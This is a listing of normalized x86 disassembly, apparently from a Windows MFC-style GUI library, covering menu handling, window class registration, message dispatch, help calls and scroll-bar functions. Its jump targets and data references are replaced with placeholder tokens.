retn 0x4
sub_43f1c5
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_44057e
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_443768
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_43e71a
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_43f202
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_44057e
test eax eax
je r-xdata
mov ecx esi
call sub_43e71a
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_43f24c
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_43e71a
lea eax [ ebp + 0xc ]
push eax
call sub_440551
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_43f277
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_443753
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_43f277
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_443768
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
jmp r-xdata
sub_43f2da
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_43fece
test eax eax
je r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_43e71a
push 0x0
mov ecx eax
call sub_440551
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_443753
push [ esi + 0x8 ]
push eax
call sub_43f277
test eax eax
je r-xdata
sub_43f352
mov eax sub_4630a4
call sub_42dc88
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_45357b
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_45565c
mov [ ebp - 0x4 ] ebx
call sub_45357b
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_4556cc
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_43f3f3
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
call sub_453349
mov esi eax
add esi 0x58
call sub_45357b
mov ebx [ ebp + 0xc ]
mov edi [ eax + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push ebx
push [ ebp + 0x8 ]
push edi
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x1c
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
leave
retn 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ DefWindowProcA@IAT ]
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] esi
call sub_43f352
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
call sub_447818
push [ ebp + 0x8 ]
push edi
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
push esi
push edi
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
sub_43f4a7
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_452fff
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_45518e
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_43f4ed
mov eax sub_4630b8
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
call sub_45357b
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bc5
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_43ff47
mov ecx esi
call sub_43fd7e
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_43ff47
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_45357b
mov ecx [ eax + 0x4 ]
call sub_441bda
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push 0xffffffff
push ebx
push 0xf107
call sub_4496ef
sub_43f5d5
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_43f615
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_43f659
mov eax sub_4630dc
call sub_42dc88
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_43e7b3
push eax
push [ ebp + 0xc ]
push edi
call sub_43e511
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_45565c
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_43e572
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_4556cc
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_4556cc
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_43f5d5
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_43f5d5
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_4556cc
mov ebx [ ebp + 0x10 ]
jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_43fb07 ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_4556cc
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_43f5d5
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_446c0a
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_43e7b3
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_43e7b3
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_446b68
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_43e388
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_43e7da
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_446b68
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_43e7b3
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_443753
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_43e7b3
push eax
push esi
call sub_43e7b3
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_446c0a
push [ ebp + 0xc ]
call sub_443753
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_443753
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_43e7b3
jmp r-xdata
push esi
call sub_43e7b3
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_43e7b3
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_43ee41
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_43e7b3
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_43e7b3
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_43e7b3
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_446c9d
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_43d531
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_43fbf5
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_452fff
mov ecx rw-data
call sub_45518e
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_44057e
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_43fbcb
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_43fc81
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_452fff
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_45518e
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_44057e
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_43fcfb
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov edi [ GetParent@IAT ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
push [ esi + 0x1c ]
jmp r-xdata
pop edi
pop esi
retn
call edi
push eax
call sub_43e7b3
mov esi eax
test esi esi
je r-xdata
sub_43fd39
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_43e7da
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_420960
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_43fd7e
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_43e7b3
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_43fd39
test eax eax
je r-xdata
sub_43fda6
test ecx ecx
push esi
je r-xdata
xor eax eax
pop esi
retn
mov esi [ ecx + 0x1c ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ GetWindowLongA@IAT ]
push 0xfffffff0
push esi
call edi
mov ebx 0x40000000
push esi
call sub_43e7b3
pop edi
pop ebx
pop esi
retn
push esi
call [ GetParent@IAT ]
test eax eax
je r-xdata
push 0xfffffff0
push eax
mov esi eax
call edi
jmp r-xdata
test ebx eax
je r-xdata
sub_43fdea
push esi
push edi
mov esi ecx
call [ GetForegroundWindow@IAT ]
push eax
call sub_43e7b3
mov ecx esi
mov edi eax
call sub_43fd7e
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_43e7b3
xor ecx ecx
cmp edi eax
sete cl
pop edi
mov eax ecx
pop esi
retn
sub_43fe1e
push esi
push edi
mov esi ecx
call sub_43fd7e
mov edi eax
call [ GetForegroundWindow@IAT ]
push eax
call sub_43e7b3
test eax eax
je r-xdata
push [ edi + 0x1c ]
call [ SetForegroundWindow@IAT ]
mov eax [ eax + 0x1c ]
mov ecx [ esi + 0x1c ]
cmp eax ecx
je r-xdata
pop edi
pop esi
retn
push ecx
push eax
call [ IsChild@IAT ]
test eax eax
jne r-xdata
sub_43fe5b
push esi
mov esi ecx
test esi esi
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov ecx esi
call sub_43fcfb
mov esi eax
mov eax esi
pop esi
retn
mov ecx esi
mov esi eax
mov ecx eax
jmp r-xdata
call sub_43fcfb
test eax eax
je r-xdata
sub_43fe9c
mov eax [ esp + 0x8 ]
push esi
test eax eax
mov esi ecx
jne r-xdata
test esi esi
jne r-xdata
call sub_45357b
mov eax [ eax + 0x10 ]
mov ecx [ esi + 0x1c ]
xor ecx ecx
jmp r-xdata
push [ esp + 0x10 ]
push eax
push [ esp + 0x10 ]
push ecx
call [ MessageBoxA@IAT ]
pop esi
retn 0xc
sub_43fece
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43fece
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43fece
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_43e7da
test eax eax
jne r-xdata
call sub_43e7b3
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_43ff47
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_43e7da
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_43e5e8
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43ff47
sub_43ffc9
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
mov eax [ esi ]
call [ eax + 0x68 ]
push [ ebp + 0x10 ]
test eax eax
push [ ebp + 0xc ]
je r-xdata
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push 0x2
push [ eax + 0x1c ]
jmp r-xdata
call [ SetScrollPos@IAT ]
pop esi
pop ebp
retn 0xc
sub_43fff9
push esi
mov esi ecx
push [ esp + 0x8 ]
mov eax [ esi ]
call [ eax + 0x68 ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
push [ esi + 0x1c ]
push 0x2
push [ eax + 0x1c ]
jmp r-xdata
call [ GetScrollPos@IAT ]
pop esi
retn 0x4
sub_440021
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
mov eax [ esi ]
call [ eax + 0x68 ]
push [ ebp + 0x14 ]
test eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
je r-xdata
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push 0x2
push [ eax + 0x1c ]
jmp r-xdata
call [ SetScrollRange@IAT ]
pop esi
pop ebp
retn 0x10
sub_440054
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
mov eax [ esi ]
call [ eax + 0x68 ]
push [ ebp + 0x10 ]
test eax eax
push [ ebp + 0xc ]
je r-xdata
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push 0x2
push [ eax + 0x1c ]
jmp r-xdata
call [ GetScrollRange@IAT ]
pop esi
pop ebp
retn 0xc
sub_440084
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0x3
jne r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x68 ]
push [ esp + 0x10 ]
test eax eax
je r-xdata
push [ esp + 0x10 ]
push 0x0
call sub_440084
push 0x1
pop edi
push edi
push [ esi + 0x1c ]
call [ ShowScrollBar@IAT ]
mov ecx eax
call sub_441841
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_4400c7
cmp [ rw-data ] 0x333
jae r-xdata
push esi
mov esi [ ecx + 0x1c ]
push edi
mov edi [ esp + 0xc ]
cmp edi 0x2
je r-xdata
xor eax eax
jmp r-xdata
push [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push eax
push edi
push esi
mov [ eax ] 0x1c
call [ SetScrollInfo@IAT ]
push 0x1
pop eax
pop edi
pop esi
mov eax [ ecx ]
push edi
call [ eax + 0x68 ]
test eax eax
je r-xdata
retn 0xc
mov esi [ eax + 0x1c ]
push 0x2
pop edi
sub_440114
cmp [ rw-data ] 0x333
jae r-xdata
push esi
mov esi [ ecx + 0x1c ]
push edi
mov edi [ esp + 0xc ]
cmp edi 0x2
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
push eax
push edi
push esi
mov [ eax ] 0x1c
mov [ eax + 0x4 ] ecx
call [ GetScrollInfo@IAT ]
pop edi
pop esi
mov eax [ ecx ]
push edi
call [ eax + 0x68 ]
test eax eax
je r-xdata
retn 0xc
mov esi [ eax + 0x1c ]
push 0x2
pop edi
sub_440161
push ebp
mov ebp esp
sub esp 0x24
lea eax [ ebp - 0x4 ]
push esi
push eax
lea eax [ ebp - 0x8 ]
push eax
mov esi ecx
push [ ebp + 0x8 ]
call sub_440054
lea eax [ ebp - 0x24 ]
push 0x2
push eax
mov ecx esi
push [ ebp + 0x8 ]
call sub_440114
test eax eax
pop esi
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x4
mov eax [ ebp - 0x14 ]
xor edx edx
lea ecx [ eax - 0x1 ]
dec eax
cmp edx ecx
sbb ecx ecx
and ecx eax
sub [ ebp - 0x4 ] ecx
sub_4401a8
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
push edi
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ ScrollWindow@IAT ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] eax
jne r-xdata
push [ ebp + 0xc ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x58 ]
mov ebx [ GetWindow@IAT ]
push 0x5
push [ esi + 0x1c ]
mov esi [ esi + 0x34 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
call sub_44736f
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
push 0x15
push eax
add ecx edx
mov edx [ ebp + 0x8 ]
push eax
push ecx
mov ecx [ ebp - 0x10 ]
add ecx edx
push ecx
push eax
push edi
call [ SetWindowPos@IAT ]
push 0x2
push edi
jmp r-xdata
call ebx
mov edi eax
test edi edi
je r-xdata
sub_44024e
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi [ ebp + 0x1c ]
mov ebx ecx
mov ecx [ ebp + 0x20 ]
xor eax eax
cmp esi eax
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebx + 0x1c ]
